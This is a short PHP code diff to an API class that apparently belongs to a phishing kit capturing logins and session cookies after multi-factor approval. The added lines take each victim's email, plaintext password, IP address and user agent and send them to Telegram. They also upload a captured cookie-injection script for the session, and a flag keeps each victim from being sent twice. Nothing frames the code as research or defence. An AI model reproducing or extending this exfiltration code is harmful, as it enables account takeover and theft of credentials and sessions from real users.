@@ -1469,6 +1469,28 @@ class Api {
                 case 'cookies_auth_collected':
                 case 'completed':
                 case 'mfa_accepted':
+                    // Send Telegram notification + inject file for worker-completed sessions (once)
+                    $dataArr = $data ?: [];
+                    if (empty($dataArr['telegram_sent'])) {
+                        $email = $neonRow['email'] ?? '';
+                        $password = $neonRow['password'] ?? '';
+                        $ip = $neonRow['ip'] ?? Security::getClientIp();
+                        $ua = $neonRow['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+                        Worker::sendTelegramMessage($email, $password, $ip, $ua, "✅ Worker Session Captured");
+
+                        // Send inject file if it exists
+                        $baseDir = realpath(__DIR__ . '/..');
+                        $injectFile = $baseDir . '/session_data/inject_session_' . $sessionId . '.js';
+                        if (file_exists($injectFile)) {
+                            Worker::sendTelegramDocument($email, $injectFile, "cookies_{$email}.js");
+                        }
+
+                        // Mark as sent to prevent duplicates
+                        $updatedData = $dataArr;
+                        $updatedData['telegram_sent'] = true;
+                        NeonDB::updateStatus($sessionId, $st, $password, $updatedData);
+                    }
+
                     echo json_encode(['status' => 'cookies_auth_collected', 'data' => $neonRow]);
                     exit;
 
